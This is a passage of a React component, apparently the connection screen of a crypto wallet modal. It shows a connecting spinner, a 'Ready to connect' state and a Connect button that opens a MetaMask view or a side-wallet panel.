                  <div className="wm-conn-icon-ring">
                    <div className="wm-conn-spin" />
                    <WalletIcon wallet={selected} size={40} />
                  </div>
                )}
                <div className="wm-conn-name">Connecting to {selected.name}</div>
                <div className="wm-conn-sub">Accept the connection request<br/>in your wallet</div>
              </div>
            ) : (
              <div className="wm-conn-wrap">
                <ConnectingVisual wallet={selected} isConnecting={false} />
                <div className="wm-conn-name">{selected.name}</div>
                <div className="wm-conn-sub">Ready to connect</div>
                <button
                  className="wm-conn-btn"
                  onClick={() => {
                    if (selected.connectType === 'fox') {
                      setShowMetaMask(true)
                    } else {
                      setSideWallet(selected)
                    }
                  }}
                >Connect</button>
              </div>
            )}
          </div>

        </div>
      </div>

    </>
  )
}
